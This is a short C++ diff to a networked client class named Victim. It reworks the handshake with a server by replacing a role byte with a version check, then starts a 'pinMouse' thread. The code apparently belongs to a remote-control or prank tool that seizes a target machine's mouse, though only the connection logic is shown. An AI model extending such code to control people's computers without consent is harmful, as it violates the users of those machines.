@@ -300,7 +300,7 @@ connect:
 
 init:
     sf::Packet p;
-    p << sf::Uint8('v') << name;
+    p << sf::Uint8(VICTIM_VERSION) << name;
     //tell server the role and the name
     if (sendServer(p) == sf::Socket::Disconnected)
         goto connect;
@@ -308,14 +308,13 @@ init:
     p.clear();
     if (server.receive(p) == sf::Socket::Disconnected)
         goto connect;
-    sf::Uint8 role = '-';
-    //check if the server has initialized the victim, else try again
-    p >> role;
-    if (role != 'v')
-        goto init;
-    //get the connection id
-    std::cout << "connection with server approved\n";
 
+    sf::Uint8 version = 0;
+    p >> version;
+    if (version != VICTIM_VERSION)
+        goto init;
+
+    std::cout << "connection with server approved\n";
     isConnected = true;
 
     std::thread pinMouse(&Victim::pinMouse, this);
